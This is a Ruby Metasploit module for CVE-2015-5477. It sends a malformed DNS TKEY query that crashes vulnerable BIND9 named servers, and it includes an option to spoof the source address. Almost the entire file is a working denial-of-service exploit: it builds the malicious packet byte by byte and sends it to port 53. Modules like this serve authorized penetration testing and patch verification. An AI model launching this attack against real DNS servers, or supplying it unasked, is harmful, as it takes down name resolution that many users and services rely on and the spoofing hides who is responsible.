# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;BIND TKEY Query Denial of Service&#039;,
      &#039;Description&#039;    => %q{
        This module sends a malformed TKEY query, which exploits an
        error in handling TKEY queries on affected BIND9 &#039;named&#039; DNS servers.
        As a result, a vulnerable named server will exit with a REQUIRE
        assertion failure. This condition can be exploited in versions of BIND
        between BIND 9.1.0 through 9.8.x, 9.9.0 through 9.9.7-P1 and 9.10.0
        through 9.10.2-P2.
      },
      &#039;Author&#039;         => [
        &#039;Jonathan Foote&#039;,      # Original discoverer
        &#039;throwawayokejxqbbif&#039;, # PoC
        &#039;wvu&#039;                  # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2015-5477&#039;],
        [&#039;URL&#039;, &#039;https://www.isc.org/blogs/cve-2015-5477-an-error-in-handling-tkey-queries-can-cause-named-to-exit-with-a-require-assertion-failure/&#039;],
        [&#039;URL&#039;, &#039;https://kb.isc.org/article/AA-01272&#039;],
        [&#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/issues/5790&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Jul 28 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DefaultOptions&#039; => {&#039;ScannerRecvWindow&#039; => 0}
    ))

    register_options([
      Opt::RPORT(53),
      OptAddress.new(&#039;SRC_ADDR&#039;, [false, &#039;Source address to spoof&#039;, nil])
    ])

    deregister_options(&#039;PCAPFILE&#039;, &#039;FILTER&#039;, &#039;SNAPLEN&#039;, &#039;TIMEOUT&#039;)
  end

  def scan_host(ip)
    if datastore[&#039;SRC_ADDR&#039;]
      scanner_spoof_send(payload, ip, rport, datastore[&#039;SRC_ADDR&#039;])
    else
      print_status("Sending packet to #{ip}")
      scanner_send(payload, ip, rport)
    end
  end

  def payload
    name = Rex::Text.rand_text_alphanumeric(rand(42) + 1)
    txt  = Rex::Text.rand_text_alphanumeric(rand(42) + 1)

    name_length = [name.length].pack(&#039;C&#039;)
    txt_length  = [txt.length].pack(&#039;C&#039;)
    data_length = [txt.length + 1].pack(&#039;n&#039;)
    ttl         = [rand(2 ** 31 - 1) + 1].pack(&#039;N&#039;)

    query  = "\x00\x00"  # Transaction ID: 0x0000
    query << "\x00\x00"  # Flags: 0x0000 Standard query
    query << "\x00\x01"  # Questions: 1
    query << "\x00\x00"  # Answer RRs: 0
    query << "\x00\x00"  # Authority RRs: 0
    query << "\x00\x01"  # Additional RRs: 1

    query << name_length # [Name Length]
    query << name        # Name
    query << "\x00"      # [End of name]
    query << "\x00\xf9"  # Type: TKEY (Transaction Key) (249)
    query << "\x00\x01"  # Class: IN (0x0001)

    query << name_length # [Name Length]
    query << name        # Name
    query << "\x00"      # [End of name]
    query << "\x00\x10"  # Type: TXT (Text strings) (16)
    query << "\x00\x01"  # Class: IN (0x0001)
    query << ttl         # Time to live
    query << data_length # Data length
    query << txt_length  # TXT Length
    query << txt         # TXT
  end

end

